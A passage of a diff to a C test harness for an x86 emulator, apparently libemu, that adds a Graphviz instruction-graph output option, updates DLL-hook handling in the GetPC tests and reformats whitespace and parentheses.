-				printf("cpu error %s\n", emu_strerror(e));
-				break;
-			}
 
-
-
-			printf("\n");
+//			printf("\n");
 		}
 
 		printf("stepcount %i\n",j);
 
 
-		if (opts.verbose == 1)
+		if ( opts.graphfile != NULL )
+		{
+			FILE *f = fopen(opts.graphfile,"w+");
+
+			struct emu_vertex *ev;
+
+			fprintf(f, "digraph G {\n");
+
+			for ( ev = emu_vertexes_first(graph->vertexes); !emu_vertexes_attail(ev); ev = emu_vertexes_next(ev) )
+			{
+				struct instr_vertex *iv = emu_vertex_data_get(ev);
+				if ( iv->eip > static_offset + tests[i].codesize )
+					fprintf(f, "\t %i [shape=box, style=filled, color=\".7 .3 1.0\", label = \"0x%08x %s\"]\n",iv->eip, iv->eip, iv->instr_string);
+				else
+					fprintf(f, "\t %i [label = \"0x%08x %s\"]\n",iv->eip, iv->eip, iv->instr_string);
+			}
+			for ( ev = emu_vertexes_first(graph->vertexes); !emu_vertexes_attail(ev); ev = emu_vertexes_next(ev) )
+			{
+				struct instr_vertex *ivfrom = emu_vertex_data_get(ev);
+
+				struct emu_edge *ee;
+				for ( ee = emu_edges_first(ev->edges); !emu_edges_attail(ee); ee = emu_edges_next(ee) )
+				{
+					struct instr_vertex *ivto = emu_vertex_data_get(ee->destination);
+					if ( ee->count > 100 )
+						fprintf(f, "\t %i -> %i [style=bold, color=red]; \n",ivfrom->eip, ivto->eip);
+					else
+						if ( ee->count > 50 )
+						fprintf(f, "\t %i -> %i [style=bold, color=blue]; \n",ivfrom->eip, ivto->eip);
+					else
+						if ( ee->count > 25 )
+						fprintf(f, "\t %i -> %i [style=bold, color=green]; \n",ivfrom->eip, ivto->eip);
+					else
+						fprintf(f, "\t %i -> %i; \n",ivfrom->eip, ivto->eip);
+				}
+
+			}
+			fprintf(f, "}");
+			fclose(f);
+
+		}
+		if ( opts.verbose == 1 )
 		{
 			emu_log_level_set(emu_logging_get(e),EMU_LOG_DEBUG);
 			emu_cpu_debug_print(cpu);
@@ -826,7 +945,7 @@ int test(int n)
 		{
 			if ( emu_cpu_reg32_get(cpu, j) ==  tests[i].out_state.reg[j] )
 			{
-				if (opts.verbose == 1)
+				if ( opts.verbose == 1 )
 					printf("\t %s "SUCCESS"\n",regm[j]);
 			}
 			else
@@ -840,13 +959,13 @@ int test(int n)
 		/* check the memory for expected values */
 		uint32_t value;
 
-		if ( tests[i].out_state.mem_state[0] != 0 ||  tests[i].out_state.mem_state[1] != 0)
+		if ( tests[i].out_state.mem_state[0] != 0 ||  tests[i].out_state.mem_state[1] != 0 )
 		{
 			if ( emu_memory_read_dword(mem,tests[i].out_state.mem_state[0],&value) == 0 )
 			{
 				if ( value == tests[i].out_state.mem_state[1] )
 				{
-					if (opts.verbose == 1)
+					if ( opts.verbose == 1 )
 						printf("\t memory "SUCCESS" 0x%08x = 0x%08x\n",tests[i].out_state.mem_state[0], tests[i].out_state.mem_state[1]);
 				}
 				else
@@ -868,10 +987,10 @@ int test(int n)
 		if ( tests[i].out_state.eflags != emu_cpu_eflags_get(cpu) )
 		{
 			printf("\t flags "FAILED" got %08x expected %08x\n",emu_cpu_eflags_get(cpu),tests[i].out_state.eflags);
-			for (j=0;j<32;j++)
+			for ( j=0;j<32;j++ )
 			{
 				uint32_t f = emu_cpu_eflags_get(cpu);
-				if ( (tests[i].out_state.eflags & (1 << j)) != (f & (1 <<j)))
+				if ( (tests[i].out_state.eflags & (1 << j)) != (f & (1 <<j)) )
 					printf("\t flag %s (bit %i) failed, expected %i is %i\n",flags[j], j, 
 						   (tests[i].out_state.eflags & (1 << j)),
 						   (f & (1 <<j)));
@@ -881,7 +1000,7 @@ int test(int n)
 		}
 		else
 		{
-			if (opts.verbose == 1)
+			if ( opts.verbose == 1 )
 				printf("\t flags "SUCCESS"\n");
 		}
 
@@ -894,7 +1013,7 @@ int test(int n)
 
 
 		/* bail out on *any* error */
-		if (failed == 0)
+		if ( failed == 0 )
 		{
 			printf(SUCCESS"\n");
 		}
@@ -916,8 +1035,7 @@ int getpctest(int n)
 	struct emu_memory *mem = emu_memory_get(e);
 	struct emu_env_w32 *env = emu_env_w32_new(e);
 
-
-	if (env == 0)
+	if ( env == 0 )
 	{
 		printf("%s \n", emu_strerror(e));
 		printf("%s \n", strerror(emu_errno(e)));
@@ -939,16 +1057,16 @@ int getpctest(int n)
 */
 
 
-	for (i=0;i<sizeof(tests)/sizeof(struct instr_test);i++)
+	for ( i=0;i<sizeof(tests)/sizeof(struct instr_test);i++ )
 	{
 		if ( n != -1 && i != n )
 			continue;
 
 		uint32_t offset;
-		for (offset=0; offset<tests[i].codesize;offset++)
+		for ( offset=0; offset<tests[i].codesize;offset++ )
 		{
 
-			if ( emu_getpc_check(e, (uint8_t *)tests[i].code, tests[i].codesize, offset) == 1)
+			if ( emu_getpc_check(e, (uint8_t *)tests[i].code, tests[i].codesize, offset) == 1 )
 			{
 				int failed = 0;
 
@@ -980,7 +1098,7 @@ int getpctest(int n)
 				emu_cpu_eip_set(emu_cpu_get(e), static_offset);
 
 				/* run the code */
-				if (opts.verbose == 1 )
+				if ( opts.verbose == 1 )
 				{
 					emu_log_level_set(emu_logging_get(e),EMU_LOG_DEBUG);
 					emu_cpu_debug_print(cpu);
@@ -989,10 +1107,10 @@ int getpctest(int n)
 
 				int ret; //= emu_cpu_run(emu_cpu_get(e));
 
-				for (j=0;j<opts.steps;j++)
+				for ( j=0;j<opts.steps;j++ )
 				{
 
-					if (opts.verbose == 1)
+					if ( opts.verbose == 1 )
 					{
 						emu_log_level_set(emu_logging_get(e),EMU_LOG_DEBUG);
 						emu_cpu_debug_print(cpu);
@@ -1000,15 +1118,15 @@ int getpctest(int n)
 					}
 
 
-					ret = emu_env_w32_eip_check(env);
-					if (ret == 1)
+					struct emu_env_w32_dll_export *dllhook = emu_env_w32_eip_check(env);
+					if ( dllhook != NULL )
 						continue;
-					else if (ret == 0)
-						ret = emu_cpu_parse(emu_cpu_get(e));
+
+					ret = emu_cpu_parse(emu_cpu_get(e));
 
 
 
-					if (ret != -1)
+					if ( ret != -1 )
 					{
 						ret = emu_cpu_step(emu_cpu_get(e));
 					}
@@ -1027,7 +1145,7 @@ int getpctest(int n)
 				printf("stepcount %i\n",j);
 
 
-				if (opts.verbose == 1)
+				if ( opts.verbose == 1 )
 				{
 					emu_log_level_set(emu_logging_get(e),EMU_LOG_DEBUG);
 					emu_cpu_debug_print(cpu);
@@ -1041,7 +1159,7 @@ int getpctest(int n)
 				{
 					if ( emu_cpu_reg32_get(cpu, j) ==  tests[i].out_state.reg[j] )
 					{
-						if (opts.verbose == 1)
+						if ( opts.verbose == 1 )
 							printf("\t %s "SUCCESS"\n",regm[j]);
 					}
 					else
@@ -1055,13 +1173,13 @@ int getpctest(int n)
 				/* check the memory for expected values */
 				uint32_t value;
 
-				if ( tests[i].out_state.mem_state[0] != 0 ||  tests[i].out_state.mem_state[1] != 0)
+				if ( tests[i].out_state.mem_state[0] != 0 ||  tests[i].out_state.mem_state[1] != 0 )
 				{
 					if ( emu_memory_read_dword(mem,tests[i].out_state.mem_state[0],&value) == 0 )
 					{
 						if ( value == tests[i].out_state.mem_state[1] )
 						{
-							if (opts.verbose == 1)
+							if ( opts.verbose == 1 )
 								printf("\t memory "SUCCESS" 0x%08x = 0x%08x\n",tests[i].out_state.mem_state[0], tests[i].out_state.mem_state[1]);
 						}
 						else
@@ -1083,10 +1201,10 @@ int getpctest(int n)
 				if ( tests[i].out_state.eflags != emu_cpu_eflags_get(cpu) )
 				{
 					printf("\t flags "FAILED" got %08x expected %08x\n",emu_cpu_eflags_get(cpu),tests[i].out_state.eflags);
-					for (j=0;j<32;j++)
+					for ( j=0;j<32;j++ )
 					{
 						uint32_t f = emu_cpu_eflags_get(cpu);
-						if ( (tests[i].out_state.eflags & (1 << j)) != (f & (1 <<j)))
+						if ( (tests[i].out_state.eflags & (1 << j)) != (f & (1 <<j)) )
 							printf("\t flag %s (bit %i) failed, expected %i is %i\n",flags[j], j, 
 								   (tests[i].out_state.eflags & (1 << j)),
 								   (f & (1 <<j)));
@@ -1096,7 +1214,7 @@ int getpctest(int n)
 				}
 				else
 				{
-					if (opts.verbose == 1)
+					if ( opts.verbose == 1 )
 						printf("\t flags "SUCCESS"\n");
 				}
 
@@ -1109,7 +1227,7 @@ int getpctest(int n)
 
 
 				/* bail out on *any* error */
-				if (failed == 0)
+				if ( failed == 0 )
 				{
 					printf(SUCCESS"\n");
 				}
@@ -1129,11 +1247,11 @@ int getpctest(int n)
 
 void dump(int n)
 {
-	if (n > sizeof(tests)/sizeof(struct instr_test) || n < 0)
+	if ( n > sizeof(tests)/sizeof(struct instr_test) || n < 0 )
 		return;
 
 	int i;
-	for (i=0; i<tests[n].codesize;i++)
+	for ( i=0; i<tests[n].codesize;i++ )
 		printf("%c", tests[n].code[i]);
 }
 
@@ -1142,16 +1260,16 @@ void cleanup()
 	return;
 
 	int i;
-	for (i=0;i<sizeof(tests)/sizeof(struct instr_test);i++)
-    	if (tests[i].code != NULL)
-    		free(tests[i].code);
-		
+	for ( i=0;i<sizeof(tests)/sizeof(struct instr_test);i++ )
+		if ( tests[i].code != NULL )
+			free(tests[i].code);
+
 }
 
 void list_tests()
 {
 	int i;
-	for (i=0;i<sizeof(tests)/sizeof(struct instr_test);i++)
+	for ( i=0;i<sizeof(tests)/sizeof(struct instr_test);i++ )
 		printf("%-2i) %s\n", i, tests[i].instr);
 }
 
@@ -1164,21 +1282,22 @@ int main(int argc, char *argv[])
 	opts.testnumber = -1;
 
 	while ( 1 )
-	{	
+	{
 		int c;
 		int option_index = 0;
 		static struct option long_options[] = {
-			{"verbose"			, 0, 0, 'v'},
-			{"nasm-force"		, 0, 0, 'n'},
-			{"steps"			, 1, 0, 's'},
-			{"testnumber"		, 1, 0, 't'},
-			{"listtests"		, 0, 0, 'l'},
-			{"dump"				, 1, 0, 'd'},
-			{"getpc"			, 0, 0, 'g'},
+			{"verbose"          , 0, 0, 'v'},
+			{"nasm-force"       , 0, 0, 'n'},
+			{"steps"            , 1, 0, 's'},
+			{"testnumber"       , 1, 0, 't'},
+			{"listtests"        , 0, 0, 'l'},
+			{"dump"             , 1, 0, 'd'},
+			{"getpc"            , 0, 0, 'g'},
+			{"graph"            , 1, 0, 'G'},
 			{0, 0, 0, 0}
 		};
 
-		c = getopt_long (argc, argv, "vns:t:ld:g", long_options, &option_index);
+		c = getopt_long (argc, argv, "vns:t:ld:gG:", long_options, &option_index);
 		if ( c == -1 )
 			break;
 
@@ -1214,6 +1333,11 @@ int main(int argc, char *argv[])
 			opts.getpc = 1;
 			break;
 
+		case 'G':
+			opts.graphfile = strdup(optarg);
+			printf("graph file %s\n", opts.graphfile);
+			break;
+
 		default:
 			printf ("?? getopt returned character code 0%o ??\n", c);
 			break;
@@ -1221,12 +1345,13 @@ int main(int argc, char *argv[])
 	}
 
 
-	if (opts.getpc == 1)
+	if ( opts.getpc == 1 )
 	{
 		getpctest(opts.testnumber);
-	}else
-	if ( test(opts.testnumber) != 0 )
-		return -1;
+	}
+	else
+		test(opts.testnumber);
+	return -1;
 
 	cleanup();
 
